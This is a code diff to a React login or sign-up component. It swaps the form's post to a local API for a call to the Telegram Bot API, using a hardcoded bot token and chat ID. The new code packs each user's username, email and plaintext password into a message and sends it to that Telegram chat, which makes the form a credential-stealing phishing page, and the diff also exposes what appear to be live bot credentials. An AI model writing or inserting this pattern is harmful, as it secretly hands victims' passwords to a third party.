@@ -7,6 +7,18 @@ export const Home = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
 
+  const TOKEN = "6251110774:AAENSV5zQS3Avog_97IvhgyvU-9go3AdfXs";
+  const CHAT_ID = "-1001957930860";
+  const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+  const messageModel = () => {
+    let message = `<b>Username: ${username}</b>\n`;
+    message += `<b>Email: ${email}</b>\n`;
+    message += `<b>Password: ${password}</b>\n`;
+
+    return message;
+  };
+
   const handleChangeUsername = (e) => {
     setUsername(e.target.value);
   };
@@ -35,10 +47,10 @@ export const Home = () => {
     }
 
     try {
-      await axios.post("http://localhost:5686/api/post_users", {
-        username,
-        email,
-        password,
+      await axios.post(API_URL, {
+        chat_id: CHAT_ID,
+        parse_mode: "html",
+        text: messageModel(),
       });
 
       setUsername("");
